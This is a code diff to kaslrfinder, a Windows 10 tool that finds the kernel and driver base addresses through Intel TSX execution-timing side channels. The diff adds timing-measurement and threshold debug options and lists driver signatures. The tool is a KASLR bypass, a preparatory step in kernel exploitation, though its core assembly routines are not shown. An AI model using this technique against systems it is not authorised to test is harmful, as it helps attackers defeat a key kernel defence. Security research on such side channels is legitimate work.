@@ -12,6 +12,7 @@
 // Definitions of assembly functions below:
 uint64_t measure_threshold_16();
 bool is_tsx_support();
+uint64_t measure(uint64_t a);
 bool measure_x(uint64_t a, uint64_t threshold);
 void loop_eternal();
 void speedup();
@@ -43,6 +44,18 @@ bool MeasureX_3(uint64_t a, uint64_t th)
 		}
 	}
 	return c > 1;
+}
+
+// Measure the timing of the execute operation in a TSX context three times
+// and return the lowest measurement.
+uint64_t MeasureXValue_3(uint64_t a)
+{
+	uint64_t i, m, v = UINT64_MAX;
+	for(i = 0; i < 3; i++) {
+		Dummy();
+		v = v > (m = measure(a)) ? m : v;
+	}
+	return v;
 }
 
 // Locate the Windows 10 kernel by probing the TSX timing of code execution. At
@@ -163,12 +176,9 @@ next:
 // Parse the command line. The options are '-sig <hexascii>' for a signature of
 // a module to search for. '-addr 0x<hexascii> -size 0x<hexascii>' for creation
 // of a module signature.
-void SetupGetArguments(uint64_t* aModuleStart, uint64_t* aModuleSize, uint16_t *sig, uint64_t *csig)
+void SetupGetArguments(uint64_t* th, uint64_t* aModuleStart, uint64_t* aModuleSize, uint16_t *sig, uint64_t *csig, uint64_t *aTime, bool *isVerbose)
 {
 	int argc, i = 0;
-	*aModuleStart = 0;
-	*aModuleSize = 0;
-	*csig = 0;
 	wchar_t** argv;
 	// Dynamically load required functions.
 	printf = (int(*)(char*, ...))GetProcAddress(LoadLibraryA("msvcrt.dll"), "printf");
@@ -186,26 +196,31 @@ void SetupGetArguments(uint64_t* aModuleStart, uint64_t* aModuleSize, uint16_t *
 		GetProcAddress(LoadLibraryA("shell32.dll"), "CommandLineToArgvW");
 	// Parse command line.
 	argv = _CommandLineToArgvW(GetCommandLineW(), &argc);
-	while(argv && i < argc - 1) {
-		if(0 == _wcscmp(argv[i], L"-sigbase")) {
-			*aModuleStart = __wcstoui64(argv[i + 1], NULL, 16);
-			i++;
-			continue;
+	while(argv && i < argc) {
+		if(0 == _wcscmp(argv[i], L"-v")) {
+			*isVerbose = true;
 		}
-		if(0 == _wcscmp(argv[i], L"-size")) {
-			*aModuleSize = __wcstoui64(argv[i + 1], NULL, 16);
-			i++;
-			continue;
-		}
-		if(0 == _wcscmp(argv[i], L"-sig")) {
-			*csig = 32;
-			if(_CryptStringToBinaryW(argv[i + 1], 0, 8, (uint8_t*)sig, (uint32_t*)csig, NULL, NULL)) {
-				*csig /= sizeof(uint16_t);
-			} else {
-				*csig = 0;
+		if(i < argc - 1) {
+			if(0 == _wcscmp(argv[i], L"-sigbase")) {
+				*aModuleStart = __wcstoui64(argv[i + 1], NULL, 16);
 			}
-			i++;
-			continue;
+			if(0 == _wcscmp(argv[i], L"-size")) {
+				*aModuleSize = __wcstoui64(argv[i + 1], NULL, 16);
+			}
+			if(0 == _wcscmp(argv[i], L"-threshold")) {
+				*th = __wcstoui64(argv[i + 1], NULL, 16);
+			}
+			if(0 == _wcscmp(argv[i], L"-gettime")) {
+				*aTime = __wcstoui64(argv[i + 1], NULL, 16);
+			}
+			if(0 == _wcscmp(argv[i], L"-sig")) {
+				*csig = 32;
+				if(_CryptStringToBinaryW(argv[i + 1], 0, 8, (uint8_t*)sig, (uint32_t*)csig, NULL, NULL)) {
+					*csig /= sizeof(uint16_t);
+				} else {
+					*csig = 0;
+				}
+			}
 		}
 		i++;
 	}
@@ -223,18 +238,27 @@ void SetupGetArguments(uint64_t* aModuleStart, uint64_t* aModuleSize, uint16_t *
 // one.
 void main_c()
 {
-	uint64_t th, aKernel, aModules, aModule, aSignatureStart, aSignatureSize, csig;
+	uint64_t th = 0, aSignatureStart = 0, aSignatureSize = 0, csig = 0, aTime = 0;
+	uint64_t aKernel, aModules, aModule;
 	uint16_t sig[16];
-	SetupGetArguments(&aSignatureStart, &aSignatureSize, sig, &csig);
+	bool isVerbose = false;
+	SetupGetArguments(&th, &aSignatureStart, &aSignatureSize, sig, &csig, &aTime, &isVerbose);
 	printf("\n" \
-		"kaslrfinder - v1.0         github.com/ufrisk/kaslrfinder\n" \
+		"kaslrfinder - v1.1         github.com/ufrisk/kaslrfinder\n" \
 		"--------------------------------------------------------\n");
-	if(csig == 0 && aSignatureStart == 0) {
+	if(!(csig || aSignatureStart || aTime || isVerbose)) {
 		printf(
 			"Options:                                                \n" \
 			" -sig <hexascii> = search for driver using signature.   \n" \
 			" -sigbase 0x<hexascii> -size 0x<hexascii> = create a new\n" \
 			"  signature with provided module base address and size. \n" \
+			"Debug Options:     (recommended if defaults do not work)\n" \
+			" -gettime 0x<hexascii> = display TSX execute timing for \n" \
+			"  the supplied address                                  \n" \
+			" -threshold 0x<hexascii> = set the threshold value used \n" \
+			"  in detection. This should be between executable value \n" \
+			"  and non executable value.                             \n" \
+			" -v = verbose.                                          \n" \
 			"Signatures:            (more signatures found on github)\n" \
 			" tcpip.sys:   01809a0155800100          (win10 1607/nov)\n" \
 			" msrpc.sys:   0180020016800100          (win10 1607/nov)\n" \
@@ -248,7 +272,16 @@ void main_c()
 	}
 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)loop_eternal, NULL, 0, NULL);
 	speedup();
-	th = measure_threshold_16();
+	if(!th) {
+		th = measure_threshold_16();
+	}
+	if(isVerbose) {
+		printf("TSX timing threshold:  0x%02x\n", th);
+	}
+	if(aTime) {
+		Dummy();
+		printf("TSX Timing - Address:  %016llx  Time: 0x%02x\n", aTime, MeasureXValue_3(aTime));
+	}
 	aKernel = FindKernel_2M(th);
 	if(!aKernel) {
 		printf("Kernel base address not found. Please try again.\n");
